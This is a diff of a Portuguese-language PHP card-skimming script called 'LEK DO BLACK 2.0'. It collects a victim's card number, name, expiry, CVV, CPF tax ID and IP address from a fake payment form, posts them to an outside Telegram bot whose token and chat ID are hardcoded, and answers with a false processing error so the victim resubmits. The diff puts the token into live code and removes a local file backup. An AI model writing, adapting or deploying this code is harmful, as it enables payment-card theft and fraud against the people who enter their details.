@@ -1,34 +1,30 @@
 <?php
-// LEK DO BLACK 2.0 - CAPTURA DE CARTÃO
-// TROQUE AS LINHAS ABAIXO PELOS SEUS DADOS
+// LEK DO BLACK 2.0 - CAPTURA DE CARTÃO (SEM ARQUIVO)
+$bot_token = "8383419436:AAGIiGuhI9UiyOuvSZy_dNWrd0yz-_c_T6U";   // COLOCA SEU TOKEN
+$chat_id = "6832775799";         // SEU CHAT_ID
 
-$bot_token = "SEU_TOKEN_AQUI";   // 8383419436:AAGIiGuhI9UiyOuvSZy_dNWrd0yz-_c_T6U
-$chat_id = "6832775799";         // 6832775799
-
-// Pega os dados que a vítima digitou
+// Pega os dados enviados
 $dados = json_decode(file_get_contents('php://input'), true);
 
-$numero = $dados['numero'] ?? '';
-$nome = $dados['nome'] ?? '';
-$validade = $dados['validade'] ?? '';
-$cvv = $dados['cvv'] ?? '';
-$cpf = $dados['cpf'] ?? '';
-$ip = $_SERVER['REMOTE_ADDR'];
+$numero = $dados['numero'] ?? 'Nao informado';
+$nome = $dados['nome'] ?? 'Nao informado';
+$validade = $dados['validade'] ?? 'Nao informado';
+$cvv = $dados['cvv'] ?? 'Nao informado';
+$cpf = $dados['cpf'] ?? 'Nao informado';
+$ip = $_SERVER['REMOTE_ADDR'] ?? 'Nao informado';
 $data = date("d/m/Y H:i:s");
 
-// Monta a mensagem que vai pro Telegram
-$mensagem = "💳💳💳 NOVA VÍTIMA 💳💳💳\n";
-$mensagem .= "━━━━━━━━━━━━━━━━━━\n";
-$mensagem .= "💳 Número: $numero\n";
+// Monta mensagem
+$mensagem = "💳💳💳 CARTAO CAPTURADO 💳💳💳\n";
+$mensagem .= "━━━━━━━━━━━━━━━━━━━━━━\n";
+$mensagem .= "💳 Numero: $numero\n";
 $mensagem .= "👤 Nome: $nome\n";
 $mensagem .= "📅 Validade: $validade\n";
 $mensagem .= "🔢 CVV: $cvv\n";
 $mensagem .= "📄 CPF: $cpf\n";
-$mensagem .= "━━━━━━━━━━━━━━━━━━\n";
+$mensagem .= "━━━━━━━━━━━━━━━━━━━━━━\n";
 $mensagem .= "📍 IP: $ip\n";
 $mensagem .= "📅 Data: $data\n";
-$mensagem .= "━━━━━━━━━━━━━━━━━━\n";
-$mensagem .= "🐺 LEK DO BLACK 2.0";
 
 // Envia pro Telegram
 $url = "https://api.telegram.org/bot$bot_token/sendMessage";
@@ -43,14 +39,9 @@ curl_setopt($ch, CURLOPT_POST, true);
 curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-curl_exec($ch);
+$resultado = curl_exec($ch);
 curl_close($ch);
 
-// Salva backup
-$arquivo = fopen("cartoes.txt", "a");
-fwrite($arquivo, "[$data] $numero | $nome | $validade | $cvv | $cpf | $ip\n");
-fclose($arquivo);
-
-// Responde com erro falso (a vítima acha que deu problema)
-echo json_encode(['success' => false, 'message' => 'Erro no processamento']);
+// Responde com erro falso (vítima tenta de novo)
+echo json_encode(['success' => false]);
 ?>
